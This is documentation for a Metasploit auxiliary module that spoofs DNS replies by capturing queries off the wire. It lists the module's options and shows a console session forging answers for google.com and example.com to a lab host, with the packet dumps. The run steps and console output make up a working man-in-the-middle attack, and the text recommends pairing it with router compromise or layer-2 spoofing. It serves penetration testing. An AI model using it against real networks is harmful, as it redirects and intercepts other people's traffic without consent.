## Vulnerable Application

This module provides a Rex based DNS service to resolve queries intercepted via the capture mixin. Configure
STATIC_ENTRIES to contain host-name mappings desired for spoofing using a hostsfile or space/semicolon separated
entries. In the default configuration, the service operates as a normal native DNS server with the exception of
consuming from and writing to the wire as opposed to a listening socket. Best when compromising routers or spoofing L2
in order to prevent return of the real reply which causes a race condition. The method by which replies are filtered is
up to the user (though iptables works fine).

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/spoof/dns/native_spoofer`
1. Do: `run`

## Options

### DISABLE_NS_CACHE

Disable DNS response caching.

### DISABLE_RESOLVER

Disable DNS request forwarding.

### FILTER

The filter string for capturing traffic. This allows the module to, for example, only process requests made from a
target host or subnet.

### INTERFACE

The name of the interface to listen on.

### NS

Specify the nameservers to use for queries, space separated.

### SEARCHLIST

DNS domain search list, comma separated.

### STATIC_ENTRIES

DNS domain search list (hosts file or space/semicolon separate entries). Example: `1.2.3.4 example.com`

## Scenarios

### DNS Spoofing

```
msf6 auxiliary(spoof/dns/native_spoofer) > show options 

Module options (auxiliary/spoof/dns/native_spoofer):

   Name              Current Setting                       Required  Description
   ----              ---------------                       --------  -----------
   DISABLE_NS_CACHE  false                                 no        Disable DNS response caching
   DISABLE_RESOLVER  false                                 no        Disable DNS request forwarding
   DOMAIN                                                  no        The target domain name
   FILTER            dst port 53 and host 192.168.250.134  no        The filter string for capturing traffic
   INTERFACE                                               no        The name of the interface
   NS                192.168.250.4                         no        Specify the nameservers to use for queries, space separated
   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RPORT             53                                    yes       The target port (TCP)
   SEARCHLIST                                              no        DNS domain search list, comma separated
   SNAPLEN           65535                                 yes       The number of bytes to capture
   SRVHOST           192.168.250.160                       yes       The local host to listen on for DNS services.
   SRVPORT           53                                    yes       The local port to listen on.
   STATIC_ENTRIES    1.2.3.4 example.com                   no        DNS domain search list (hosts file or space/semicolon separate entries)
   THREADS           1                                     yes       Number of threads to use in threaded queries
   TIMEOUT           500                                   yes       The number of seconds to wait for new data


Auxiliary action:

   Name     Description
   ----     -----------
   Service  Serve DNS entries


msf6 auxiliary(spoof/dns/native_spoofer) > run
[*] Auxiliary module running as background job 2.
msf6 auxiliary(spoof/dns/native_spoofer) > SIOCSIFFLAGS: Operation not permitted
msf6 auxiliary(spoof/dns/native_spoofer) > 
[*] Caching response google.com:172.217.15.110 A
[+] Sent packet with header:
--EthHeader-----------------------------------
  eth_dst   50:eb:71:1a:59:8c PacketFu::EthMac
  eth_src   36:a6:88:92:60:5b PacketFu::EthMac
  eth_proto 0x0800            StructFu::Int16 
--IPHeader------------------------------------
  ip_v      4                 Integer         
  ip_hl     5                 Integer         
  ip_tos    0                 StructFu::Int8  
  ip_len    144               StructFu::Int16 
  ip_id     0x403c            StructFu::Int16 
  ip_frag   0                 StructFu::Int16 
  ip_ttl    64                StructFu::Int8  
  ip_proto  17                StructFu::Int8  
  ip_sum    0xc3a8            StructFu::Int16 
  ip_src    192.168.250.160   PacketFu::Octets
  ip_dst    192.168.250.134   PacketFu::Octets
--UDPHeader-----------------------------------
  udp_src   53                StructFu::Int16 
  udp_dst   39435             StructFu::Int16 
  udp_len   124               StructFu::Int16 
  udp_sum   0xeefc            StructFu::Int16 
------------------------------------------------------------------
00-01-02-03-04-05-06-07-08-09-0a-0b-0c-0d-0e-0f---0123456789abcdef
------------------------------------------------------------------
10 4a 81 80 00 01 00 01 00 04 00 00 06 67 6f 6f   .J...........goo
67 6c 65 03 63 6f 6d 00 00 01 00 01 c0 0c 00 01   gle.com.........
00 01 00 00 00 7a 00 04 ac d9 0f 6e c0 0c 00 02   .....z.....n....
00 01 00 00 40 b5 00 06 03 6e 73 32 c0 0c c0 0c   ....@....ns2....
00 02 00 01 00 00 40 b5 00 06 03 6e 73 31 c0 0c   ......@....ns1..
c0 0c 00 02 00 01 00 00 40 b5 00 06 03 6e 73 33   ........@....ns3
c0 0c c0 0c 00 02 00 01 00 00 40 b5 00 06 03 6e   ..........@....n
73 34 c0 0c                                       s4..
[+] Spoofed records for google.com to 192.168.250.134:39435
[+] Sent packet with header:
--EthHeader-----------------------------------
  eth_dst   50:eb:71:1a:59:8c PacketFu::EthMac
  eth_src   36:a6:88:92:60:5b PacketFu::EthMac
  eth_proto 0x0800            StructFu::Int16 
--IPHeader------------------------------------
  ip_v      4                 Integer         
  ip_hl     5                 Integer         
  ip_tos    0                 StructFu::Int8  
  ip_len    96                StructFu::Int16 
  ip_id     0x2ff2            StructFu::Int16 
  ip_frag   0                 StructFu::Int16 
  ip_ttl    64                StructFu::Int8  
  ip_proto  17                StructFu::Int8  
  ip_sum    0xd422            StructFu::Int16 
  ip_src    192.168.250.160   PacketFu::Octets
  ip_dst    192.168.250.134   PacketFu::Octets
--UDPHeader-----------------------------------
  udp_src   53                StructFu::Int16 
  udp_dst   38058             StructFu::Int16 
  udp_len   76                StructFu::Int16 
  udp_sum   0x00ab            StructFu::Int16 
------------------------------------------------------------------
00-01-02-03-04-05-06-07-08-09-0a-0b-0c-0d-0e-0f---0123456789abcdef
------------------------------------------------------------------
33 c8 81 20 00 01 00 01 00 00 00 01 07 65 78 61   3.. .........exa
6d 70 6c 65 03 63 6f 6d 00 00 01 00 01 c0 0c 00   mple.com........
01 00 01 00 00 00 00 00 04 01 02 03 04 00 00 29   ...............)
10 00 00 00 00 00 00 0c 00 0a 00 08 6f 59 ce 04   ............oY..
8e 13 7b 7d                                       ..{}
[+] Spoofed records for example.com to 192.168.250.134:38058
```
